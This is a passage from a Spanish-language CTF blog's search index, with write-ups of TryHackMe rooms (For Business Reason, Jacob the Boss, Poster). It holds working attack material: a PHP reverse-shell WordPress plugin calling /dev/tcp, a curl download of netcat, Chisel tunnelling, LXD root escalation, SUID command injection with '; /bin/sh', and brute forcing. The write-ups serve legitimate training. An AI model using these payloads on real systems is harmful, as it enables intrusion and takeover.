acceso a la base de datos Admirer, misma que conectamos a nuestra maquina para explotar una vulnerabilidad que nos dio acceso a la maquina. Realizando Python Library Hijacking obtuvimos acceso como root.","id":38,"section":"posts","tags":["ftp","adminer","python library hijacking","nmap","gobuster","python"],"title":"Hack The Box - Admirer","uri":"https://sckull.github.io/posts/admirer/"},{"content":"  For Business Reason es una maquina de TryHackMe, realizamos un ataque de contraseñas al login de WordPress para luego instalar un Plugin y obtener una shell. Nos encontramos en un contenedor de Docker donde realizamos un escaneo de la red para luego ejecutar un Tunnel con Chisel y obtener el puerto SSH que nos permitio ingresar reutilizando credenciales. Finalmente escalamos privilegios creando un nuevo contenedor con LXC.\nRoom    Titulo For Business Reasons      Descripción In your network scan, you found an unknown VM\u0026hellip;.   Puntos 190   Dificultad Dificil   Maker MsMouse     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) abierto, desconocido (7946) y el puerto ssh (22) aparentemente cerrado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  # Nmap 7.80 scan initiated Sat Sep 19 21:19:12 2020 as: nmap -p- --min-rate 1000 -o allports bussines.thm Nmap scan report for bussines.thm (10.10.85.176) Host is up (0.36s latency). Not shown: 65532 filtered ports PORT STATE SERVICE 22/tcp closed ssh 80/tcp open http 7946/tcp closed unknown # Nmap done at Sat Sep 19 21:21:24 2020 -- 1 IP address (1 host up) scanned in 132.07 seconds # Nmap 7.80 scan initiated Sat Sep 19 21:21:51 2020 as: nmap -sV -sC -p 22,80,7946 -o servicesport bussines.thm Nmap scan report for bussines.thm (10.10.85.176) Host is up (0.29s latency). PORT STATE SERVICE VERSION 22/tcp closed ssh 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-generator: WordPress 5.4.2 | http-robots.txt: 1 disallowed entry |_/wp-admin/ |_http-server-header: Apache/2.4.38 (Debian) |_http-title: MilkCo Test/POC site \u0026amp;#8211; Just another WordPress site 7946/tcp closed unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Sep 19 21:22:13 2020 -- 1 IP address (1 host up) scanned in 21.70 seconds   HTTP Encontramos una pagina web WordPress en el puerto 80.\nRUSTBUSTER Utilizamos RUSTBUSTER para busqueda de directorios y archivos, en donde podemos observar varias direcciones las cuales se muestran diferentes a lo normal pero que son direcciones no disponibles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  kali@kali:~/thm/bussiness$ /opt/rustbuster/rustbuster dir -u http://10.10.141.160 -w /usr/share/seclists/Discovery/Web-Content/big.txt -e php,html,txt ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at\t: 2020-09-19 21:25:08 GET\t301 Moved Permanently\thttp://10.10.141.160/! =\u0026gt; http://10.10.141.160/ GET 301 Moved Permanently http://10.10.141.160/0 =\u0026gt; http://10.10.141.160/0/ GET 301 Moved Permanently http://10.10.141.160/0000 =\u0026gt; http://10.10.141.160/0000/ GET 301 Moved Permanently http://10.10.141.160/2020 =\u0026gt; http://10.10.141.160/2020/ GET 301 Moved Permanently http://10.10.141.160/asdfjkl; =\u0026gt; http://10.10.141.160/asdfjkl GET 301 Moved Permanently http://10.10.141.160/atom =\u0026gt; http://10.10.141.160/feed/atom/ GET 301 Moved Permanently http://10.10.141.160/embed =\u0026gt; http://10.10.141.160/embed/ GET 302 Found http://10.10.141.160/favicon.ico =\u0026gt; http:/wp-includes/images/w-logo-blue-white-bg.png GET 301 Moved Permanently http://10.10.141.160/feed =\u0026gt; http://10.10.141.160/feed/ GET 301 Moved Permanently http://10.10.141.160/fixed! =\u0026gt; http://10.10.141.160/fixed GET 200 OK http://10.10.141.160/images GET 301 Moved Permanently http://10.10.141.160/index.php =\u0026gt; http://10.10.141.160/ GET 200 OK http://10.10.141.160/license.txt GET 403 Forbidden http://10.10.141.160/lost%2Bfound GET 403 Forbidden http://10.10.141.160/lost+found GET 301 Moved Permanently http://10.10.141.160/mysql =\u0026gt; http://10.10.141.160/mysql/ GET 200 OK http://10.10.141.160/note.txt GET 301 Moved Permanently http://10.10.141.160/page1 =\u0026gt; http://10.10.141.160/ GET 301 Moved Permanently http://10.10.141.160/rdf =\u0026gt; http://10.10.141.160/feed/rdf/ GET 200 OK http://10.10.141.160/readme.html GET 200 OK http://10.10.141.160/robots.txt GET 200 OK http://10.10.141.160/robots.txt GET 301 Moved Permanently http://10.10.141.160/rss =\u0026gt; http://10.10.141.160/feed/ GET 301 Moved Permanently http://10.10.141.160/rss2 =\u0026gt; http://10.10.141.160/feed/ GET 301 Moved Permanently http://10.10.141.160/sample-page =\u0026gt; http://10.10.141.160/sample-page/ GET 403 Forbidden http://10.10.141.160/server-status GET 301 Moved Permanently http://10.10.141.160/wp-admin =\u0026gt; http://10.10.141.160/wp-admin/ GET 200 OK http://10.10.141.160/wp-config.php GET 301 Moved Permanently http://10.10.141.160/wp-content =\u0026gt; http://10.10.141.160/wp-content/ GET 301 Moved Permanently http://10.10.141.160/wp-feed.php =\u0026gt; http:/feed/ GET 301 Moved Permanently http://10.10.141.160/wp-includes =\u0026gt; http://10.10.141.160/wp-includes/ GET 200 OK http://10.10.141.160/wp-login.php GET 301 Moved Permanently http://10.10.141.160/wp-register.php =\u0026gt; http:/wp-login.php?action=register GET 301 Moved Permanently http://10.10.141.160/wp-rss2.php =\u0026gt; http:/feed/ GET 405 Method Not Allowed http://10.10.141.160/xmlrpc.php   Encontramos en el archivo robots.txt la direccion del panel de wordpress, tambien vemos una nota donde hablan sobre wordpress en un contenedor de docker.\nrobots.txt note.txt  1 2 3  User-agent: * Disallow: /wp-admin/ Allow: /wp-admin/admin-ajax.php     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  from ticket 2915 cio wants to save money- asked us to move the wordpress site off the hosted. I setup the same versions in the docker container with teh startup script. POC complete will wait on cio\u0026#39;s office to test and see if acceptable -BWJ Ticket 3313 software audit found this version downlevel, added script to make sure its latest -RLB Ticket 3622 Quarterly password change completed -BWJ Ticket 4119 Quarterly password change completed -BWJ Ticket 4322 Auto update broke site, got a page. Disabled updates for now. emailed Rick Bligh to warn him. Emailed Bill Johnson to ask him to follow up with CIO\u0026#39;s office and get this tested. Going back to bed. -RLP Ticket 4325 Updates fixed, reeneabled. RLB isn\u0026#39;t here anymore. Talk to the CIO not me. -BWJ       'use strict'; var containerId = JSON.parse(\"\\\"35a06724ed532127\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  WPSCAN Utilizamos wpscan para busqueda de vulnerabilidades y usuarios en la pagina de wordpress en donde encontramos un usuario: sysadmin y la version de wordpress. Con el usuario ejecutamos un ataque de fuerza bruta junto al wordlist rockyou.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  [+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10). | Found By: Emoji Settings (Passive Detection) | - http://bussines.thm/, Match: \u0026#39;wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.4.2\u0026#39; | Confirmed By: Meta Generator (Passive Detection) | - http://bussines.thm/, Match: \u0026#39;WordPress 5.4.2\u0026#39; [i] The main theme could not be detected. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 \u0026lt;===============================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:01 [i] User(s) Identified: [+] sysadmin | Found By: Wp Json Api (Aggressive Detection) | - http://bussines.thm/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Confirmed By: | Rss Generator (Aggressive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)   WWW-DATA Utilizamos las credenciales que encontramos en wpscan para ingresar a wordpress, en donde vemos que el usuario sysadmin es administrador. Para obtener una shell creamos un \u0026ldquo;plugin\u0026rdquo; el cual se ejecuta cuando este es activado o desactivado en el panel de Plugins. Para la creacion de nuestro plugin utilizamos el siguiente archivo php el cual comprimimos con zip.\nUsuario Administrador\n1 2 3 4 5 6 7 8 9 10 11 12 13  \u0026lt;?php /** * Plugin Name: Reverse Shell Plugin * Plugin URI: * Description: Reverse Shell Plugin * Version: 1.0 * Author: Vince Matteo * Author URI: http://www.sevenlayers.com */ exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/8080 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt;   1  zip super-duper-plugin.zip shell.php   Una vez creado nuestro archivo zip ponemos a la escucha netcat en el puerto indicado en nuestra shell e instalamos el plugin en el panel de plugins. Luego de activar el plugin logramos obtener una shell con usuario www-data y nuestra flag flag0.txt.\nInstalacion de Plugin\nDOCKER \u0026amp; CHISEL En la maquina no logramos encontrar algun tipo de binario, archivo, cron o usuario que nos ayude a escalar privilegios ya que el lugar donde nos encontramos es un contenedor de docker. Lo mencionaron en el archivo notes.txt, para comprobar esto es posible ver el directorio / donde comunmente se encuentra el archivo .dockerenv, además de ello en la carpeta de wordpress (/var/www/html) encontramos un archivo de docker que contiene la configuracion para que wordpress se ejecute en un contenedor, tambien encontramos que muchos de los comandos que comunmente se encuentran en una maquina en linux no existen.\nDocker\nCon todo esto lo unico que nos queda es analizar las IPs de alguna otra maquina, pero recordemos, la maquina tiene el puerto ssh (22) ¿cerrado?. Utilizando curl descargamos netcat para poder realizar un escaneo de puertos a nuestra IP e IPs.\n1 2 3 4 5  #Local Machine python3 -m http.server 80 #Bussines Machine as WWW-DATA curl 10.10.10.10/nc -o nc   Ejecutamos hostname -I para conocer nuestra IP ya que net-tools no esta instalado en el contenedor, realizamos un escaneo de puertos y un test de conexion al puerto 22 con la IP o IPs encontradas con los siguientes comandos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  #IP address www-data@803690c13932:/tmp/tmp$ hostname -I hostname -I 10.255.0.4 172.18.0.4 10.0.0.5 #port 22 - scan www-data@803690c13932:/tmp/tmp$ for i in {1..25}; do ./nc -v -n -z -w 1 172.18.0.$i 22; done \u0026lt;{1..25}; do ./nc -v -n -z -w 1 172.18.0.$i 22; done (UNKNOWN) [172.18.0.1] 22 (?) open (UNKNOWN) [172.18.0.2] 22 (?) : Connection timed out (UNKNOWN) [172.18.0.3] 22 (?) : Connection timed out (UNKNOWN) [172.18.0.4] 22 (?) : Connection refused [... REDACTED ...] #Test - port 22 www-data@803690c13932:/tmp/tmp$ ./nc 172.18.0.1 22 ./nc 172.18.0.1 22 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1 Protocol mismatch.   Vemos que el puerto 22 esta a la escucha, pero al parecer solo esta localmente (127.0.0.1:22). Para poder realizar una enumeracion a este puerto es necesario exponerlo o traerlo localmente a nuestra maquina, para ello utilizamos Chisel, 0xdf explica un poco acerca de esta herramienta. Basicamente lo que vamos a realizar es, obtener el puerto 22 de la maquina bussines.thm a un puerto local de nuestra maquina con los siguientes comandos:\n1 2 3 4 5 6 7  #Local - Kali #chisel server -p \u0026lt;PORT\u0026gt; --reverse kali@kali:~/thm/bussiness$ ./chisel server -p 8181 --reverse 2020/09/19 22:33:43 server: Reverse tunnelling enabled 2020/09/19 22:33:43 server: Fingerprint f6:e0:73:5b:cb:b3:0f:1f:da:8f:9b:93:81:af:7a:ab 2020/09/19 22:33:43 server: Listening on http://0.0.0.0:8181 2020/09/19 22:33:46 server: session#1: tun: proxy#R:2222=\u0026gt;172.18.0.1:22: Listening   Y en la maquina (bussines.thm) descargamos y tambien ejecutamos chisel:\n1 2 3 4 5 6 7  #bussines.thm #chisel client \u0026lt;SERVER-IP\u0026gt;:\u0026lt;SERVER-PORT\u0026gt; R:\u0026lt;LOCAL-PORT-DEST\u0026gt;:\u0026lt;IP-TO-REVERSE\u0026gt;:\u0026lt;PORT-TO-REVERSE\u0026gt; www-data@803690c13932:/tmp/tmp$ ./chisel client 10.10.10.10:8181 R:2222:172.18.0.1:22 \u0026lt;chisel client 10.2.29.162:8181 R:2222:172.18.0.1:22 2020/09/20 02:33:25 client: Connecting to ws://10.10.10.10:8181 2020/09/20 02:33:45 client: Fingerprint f6:e0:73:5b:cb:b3:0f:1f:da:8f:9b:93:81:af:7a:ab 2020/09/20 02:33:46 client: Connected (Latency 302.520711ms)   Ahora podemos verificar que el puerto 22 de la IP 172.18.0.1 este localmente en el puerto 2222 de nuestro localhost:\n1 2 3 4 5 6 7  kali@kali:~/thm/bussiness$ netstat -ntpl Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 12764/python3 tcp6 0 0 :::2222 :::* LISTEN 12882/./chisel \u0026lt;\u0026lt;\u0026lt;------- tcp6 0 0 :::8181 :::* LISTEN 12882/./chisel kali@kali:~/thm/bussiness$   SYSADMIN - USER Reutilizando las credenciales del usuario sysadmin ingresamos al servicio SSH de la maquina bussines.thm mediante el puerto local 2222. Logrando obtener una shell con este usuario y nuestra flag flag1.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con id y vemos que el usuario pertenece al grupo de lxd.\n1 2  sysadmin@ubuntu:~$ id uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),122(docker)   Ya que este usuario pertenece a este grupo (lxd) vamos a escalar privilegios a traves de este al igual que en la maquina de THM - GamingServer.\n1 2 3 4 5 6 7 8 9 10 11 12 13  #LOCAL git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine -a i686 #BUSSINES.THM MACHINE lxc image import ./alpine-v3.12-i686-20200831_2152.tar.gz --alias myimage lxc image list lxc init myimage sckull -c security.privileged=true lxc config device add sckull mydevice disk source=/ path=/mnt/root recursive=true lxc start sckull lxc exec sckull /bin/sh   Logramos obtener una shell con usuario root y nuestra ultima flag flag2.txt.\n","description":"For Business Reason es una maquina de TryHackMe, realizamos un ataque de contraseñas al login de WordPress para luego instalar un Plugin y obtener una shell. Nos encontramos en un contenedor de Docker donde realizamos un escaneo de la red para luego ejecutar un Tunnel con Chisel y obtener el puerto SSH que nos permitio ingresar reutilizando credenciales. Finalmente escalamos privilegios creando un nuevo contenedor con LXC.","id":39,"section":"posts","tags":["docker","chisel","wpscan","lxc"],"title":"TryHackMe - For Business Reason","uri":"https://sckull.github.io/posts/forbusinesreason/"},{"content":"  Jacob the Boss es una maquina de TryHackMe, la version de JBossWS es vulnerable por lo que utilizamos JexBoss Tool para ejecutar una shell inversa. Finalmente escalamos privilegios con un fichero SUID.\nRoom    Titulo Jacob the Boss      Descripción Find a way in and learn a little more.   Puntos 160   Dificultad Media   Maker waldir     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22), http (80), mysql (3306), apache tomcat (8080) y el servicio jboss (8083) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  # Nmap 7.80 scan initiated Tue Sep 8 17:24:17 2020 as: nmap -sV -o mini_scan jacobtheboss.box Nmap scan report for jacobtheboss.box (10.10.186.254) Host is up (0.28s latency). Not shown: 987 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/7.3.20) 111/tcp open rpcbind 1090/tcp open java-rmi Java RMI 1098/tcp open java-rmi Java RMI 1099/tcp open java-object Java Object Serialization 3306/tcp open mysql MariaDB (unauthorized) 4444/tcp open krb524? 4445/tcp open java-object Java Object Serialization 4446/tcp open java-object Java Object Serialization 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 8083/tcp open http JBoss service httpd 3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1099-TCP:V=7.80%I=7%D=9/8%Time=5F57F69E%P=x86_64-pc-linux-gnu%r(NUL SF:L,16F,\u0026#34;\\xac\\xed\\0\\x05sr\\0\\x19java\\.rmi\\.MarshalledObject\\|\\xbd\\x1e\\x97\\ SF:xedc\\xfc\u0026gt;\\x02\\0\\x03I\\0\\x04hash\\[\\0\\x08locBytest\\0\\x02\\[B\\[\\0\\x08objByte SF:sq\\0~\\0\\x01xp\\]3S\\xc2ur\\0\\x02\\[B\\xac\\xf3\\x17\\xf8\\x06\\x08T\\xe0\\x02\\0\\0xp SF:\\0\\0\\0\\.\\xac\\xed\\0\\x05t\\0\\x1dhttp://jacobtheboss\\.box:8083/q\\0~\\0\\0q\\0~ SF:\\0\\0uq\\0~\\0\\x03\\0\\0\\0\\xc7\\xac\\xed\\0\\x05sr\\0\\x20org\\.jnp\\.server\\.Naming SF:Server_Stub\\0\\0\\0\\0\\0\\0\\0\\x02\\x02\\0\\0xr\\0\\x1ajava\\.rmi\\.server\\.RemoteS SF:tub\\xe9\\xfe\\xdc\\xc9\\x8b\\xe1e\\x1a\\x02\\0\\0xr\\0\\x1cjava\\.rmi\\.server\\.Remo SF:teObject\\xd3a\\xb4\\x91\\x0ca3\\x1e\\x03\\0\\0xpw;\\0\\x0bUnicastRef2\\0\\0\\x10jac SF:obtheboss\\.box\\0\\0\\x04J\\0\\0\\0\\0\\0\\0\\0\\0\\xd7\\xc7\\x1c\\xd8\\0\\0\\x01to\\x99\\x SF:ed;\\x80\\0\\0x\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port4445-TCP:V=7.80%I=7%D=9/8%Time=5F57F6A3%P=x86_64-pc-linux-gnu%r(NUL SF:L,4,\u0026#34;\\xac\\xed\\0\\x05\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port4446-TCP:V=7.80%I=7%D=9/8%Time=5F57F6A3%P=x86_64-pc-linux-gnu%r(NUL SF:L,4,\u0026#34;\\xac\\xed\\0\\x05\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 8 17:25:12 2020 -- 1 IP address (1 host up) scanned in 54.24 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  kali@kali:~/thm/jacobtheboss$ gobuster dir -u http://jacobtheboss.box/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /admin (Status: 301) /cache (Status: 403) /cgi-bin/ (Status: 403) /cgi-bin/.html (Status: 403) /db (Status: 403) /inc (Status: 403) /index.php (Status: 200) /index.php (Status: 200) /LICENSE (Status: 200) /plugins (Status: 403) /public (Status: 301) /themes (Status: 301) /var (Status: 403)   RPCBIND RCP solo nos muestra que la conexion ha sido rechazada sin las credenciales.\n1 2  kali@kali:~/thm/jacobtheboss$ rpcclient -U \u0026#39;\u0026#39; -N jacobtheboss.box Cannot connect to server. Error was NT_STATUS_CONNECTION_REFUSED   HTTP 8080 Encontramos JBoss en el puerto 8080.\nVerificamos la version de la plataforma en /jbossws/.\nJACOB - USER JBoss - JexBoss Tool Utilizamos Jexbooss para verificar si es vulnerable a los diferentes vectores. Vemos que es vulnerable a 3 de los 8 disponibles en esta herramienta.\nUtilizamos la misma herramienta para ejecutar una shell inversa al igual que en THM - Tony The Tiger.\nLogramos obtener una shell con el usuario jacob y la flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion en busqueda de archivos SUID y vemos varios comandos/binarios, a un principio se veia prometedor crontab pero al ejecutar crontab -e lo cual nos permitiria crear un cron como usuario root no era suficiente la shell que teniamos. Vemos tambien pingsys el cual realiza un ping a una determinada IP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  [jacob@jacobtheboss /]$ find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah -rwsr-xr-x. 1 root root 73K Aug 9 2019 /usr/bin/chage -rws--x--x. 1 root root 24K Apr 1 04:51 /usr/bin/chfn -rws--x--x. 1 root root 24K Apr 1 04:51 /usr/bin/chsh -rwsr-xr-x. 1 root root 57K Aug 8 2019 /usr/bin/crontab -rwsr-xr-x. 1 root root 32K Oct 30 2018 /usr/bin/fusermount -rwsr-xr-x. 1 root root 77K Aug 9 2019 /usr/bin/gpasswd -rwsr-xr-x. 1 root root 44K Apr 1 04:51 /usr/bin/mount -rwsr-xr-x. 1 root root 41K Aug 9 2019 /usr/bin/newgrp -rwsr-xr-x. 1 root root 28K Apr 1 03:57 /usr/bin/passwd -rwsr-xr-x. 1 root root 8.4K Jul 30 22:10 /usr/bin/pingsys -rwsr-xr-x. 1 root root 24K Apr 1 04:07 /usr/bin/pkexec -rwsr-xr-x. 1 root root 32K Apr 1 04:51 /usr/bin/su ---s--x--x. 1 root root 144K Apr 1 04:37 /usr/bin/sudo -rwsr-xr-x. 1 root root 32K Apr 1 04:51 /usr/bin/umount -rwsr-x---. 1 root dbus 57K Jul 13 14:23 /usr/libexec/dbus-1/dbus-daemon-launch-helper -rwsr-xr-x. 1 root root 16K Apr 1 04:07 /usr/lib/polkit-1/polkit-agent-helper-1 -rwsr-xr-x. 1 root root 115K Apr 1 03:55 /usr/sbin/mount.nfs -rwsr-xr-x. 1 root root 11K Apr 1 04:00 /usr/sbin/pam_timestamp_check -rwsr-xr-x. 1 root root 36K Apr 1 04:00 /usr/sbin/unix_chkpwd -rwsr-xr-x. 1 root root 12K Apr 1 02:50 /usr/sbin/usernetctl   Despues de investigar un poco sobre pingsys encontramos un post en donde habla acerca de este binario, el codigo fuente y de cómo es posible obtener una shell con privilegios root. El Binario que encontramos en la maquina tiene strings muy parecidas al del codigo del post.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  [jacob@jacobtheboss /]$ file /usr/bin/pingsys /usr/bin/pingsys: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=6edc93ec3e4b82857772727e602265140ee00823, not stripped [jacob@jacobtheboss /]$ strings /usr/bin/pingsys /lib64/ld-linux-x86-64.so.2 wrr~`\u0026#34;e libc.so.6 setuid system __libc_start_main snprintf __gmon_start__ GLIBC_2.2.5 UH-P UH-P []A\\A]A^A_ ping -c 4 %s setUID ERROR ;*3$\u0026#34; [... REDACTED ...] [root@jacobtheboss .ssh]#   Utilizamos pingsys pasandole una IP y /bin/sh separados por ; lo cual va a realizar ping sobre la IP y luego ejecutará /bin/sh, logramos obtener una shell con usuario root y la flag root.txt.\n1  /usr/bin/pingsys \u0026#39;127.0.0.1; /bin/sh\u0026#39;   ","description":"Jacob the Boss es una maquina de TryHackMe, la version de JBossWS es vulnerable por lo que utilizamos JexBoss Tool para ejecutar una shell inversa. Finalmente escalamos privilegios con un fichero SUID.","id":40,"section":"posts","tags":["jboss","jexboss tool","suid"],"title":"TryHackMe - Jacob the Boss","uri":"https://sckull.github.io/posts/jacobtheboss/"},{"content":"  Poster es una maquina de TryHackMe, esta enfocada en PostgreSQL medio por el cual se obtuvieron credenciales para acceder por SSH. Credenciales almacenadas nos dieron acceso al siguiente usuario. Escalamos privilegios utilizando Sudo.\nRoom    Titulo Poster      Descripción The sys admin set up a rdbms in a safe way.   Puntos 760   Dificultad Facil   Maker stuxnet     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto postgresql (5432) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  # Nmap 7.80 scan initiated Fri Sep 11 23:46:50 2020 as: nmap -Pn -p- --min-rate=1000 -o allports poster.thm Warning: 10.10.111.10 giving up on port because retransmission cap hit (10). Nmap scan report for poster.thm (10.10.111.10) Host is up (0.26s latency). Not shown: 63651 closed ports, 1882 filtered ports PORT STATE SERVICE 80/tcp open http 5432/tcp open postgresql # Nmap done at Fri Sep 11 23:49:38 2020 -- 1 IP address (1 host up) scanned in 168.04 seconds # Nmap 7.80 scan initiated Fri Sep 11 23:51:06 2020 as: nmap -Pn -sV -sC -p80,5432 -o servicePorts poster.thm Nmap scan report for poster.thm (10.10.111.10) Host is up (0.34s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Poster CMS 5432/tcp open postgresql PostgreSQL DB 9.5.8 - 9.5.10 | ssl-cert: Subject: commonName=ubuntu | Not valid before: 2020-07-29T00:54:25 |_Not valid after: 2030-07-27T00:54:25 |_ssl-date: TLS randomness does not represent time Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Sep 11 23:51:23 2020 -- 1 IP address (1 host up) scanned in 16.70 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5  kali@kali:~/thm/poster$ gobuster dir -u http://poster.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /images (Status: 301) /index.html (Status: 200) /server-status (Status: 403)   POSTGRESQL - METASPLOIT Utilizando un modulo de metasploit para la enumeracion de usuarios por default logramos encontrar unas credenciales. Hay que mencionar que el nombre de las bases de datos que postgres crea durante la instalacion son: postgres y template1, por lo que es posible utilizar uno de estos dos para realizar una enumeracion de credenciales.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  msf5 \u0026gt; search type:auxiliary postgres Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/http/manageengine_pmp_privesc 2014-11-08 normal Yes ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection 1 auxiliary/admin/http/rails_devise_pass_reset 2013-01-28 normal No Ruby on Rails Devise Authentication Password Reset 2 auxiliary/admin/postgres/postgres_readfile normal No PostgreSQL Server Generic Query 3 auxiliary/admin/postgres/postgres_sql normal No PostgreSQL Server Generic Query 4 auxiliary/analyze/crack_databases normal No Password Cracker: Databases 5 auxiliary/scanner/postgres/postgres_dbname_flag_injection normal No PostgreSQL Database Name Command Line Flag Injection 6 auxiliary/scanner/postgres/postgres_hashdump normal No Postgres Password Hashdump 7 auxiliary/scanner/postgres/postgres_login normal No PostgreSQL Login Utility 8 auxiliary/scanner/postgres/postgres_schemadump normal No Postgres Schema Dump 9 auxiliary/scanner/postgres/postgres_version normal No PostgreSQL Version Probe 10 auxiliary/server/capture/postgresql normal No Authentication Capture: PostgreSQL msf5 \u0026gt; use auxiliary/scanner/postgres/postgres_login msf5 auxiliary(scanner/postgres/postgres_login) \u0026gt; show options Module options (auxiliary/scanner/postgres/postgres_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DATABASE template1 yes The database to authenticate against DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list PASSWORD no A specific password to authenticate with PASS_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt no File containing passwords, one per line Proxies no A proxy chain of format type:host:port[,type:host:port][...] RETURN_ROWSET true no Set to true to see query result sets RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port STOP_ON_SUCCESS false yes Stop guessing when a credential works for a host THREADS 1 yes The number of concurrent threads (max one per host) USERNAME no A specific username to authenticate as USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt no File containing (space-separated) users and passwords, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt no File containing users, one per line VERBOSE true yes Whether to print output for all attempts msf5 auxiliary(scanner/postgres/postgres_login) \u0026gt; set rhosts poster.thm rhosts =\u0026gt; poster.thm msf5 auxiliary(scanner/postgres/postgres_login) \u0026gt; run [!] No active DB -- Credential data will not be saved! [-] 10.10.111.10:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password) [... REDACTED ...] [+] 10.10.111.10:5432 - Login Successful: [... REDACTED ...] [... REDACTED ...] [-] 10.10.111.10:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf5 auxiliary(scanner/postgres/postgres_login) \u0026gt;   Con las credenciales encontradas podemos verificar que el usuario actual pueda realizar Querys en la base de datos template1. El query que trae por defecto el modulo es para verificar la version de postgres.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 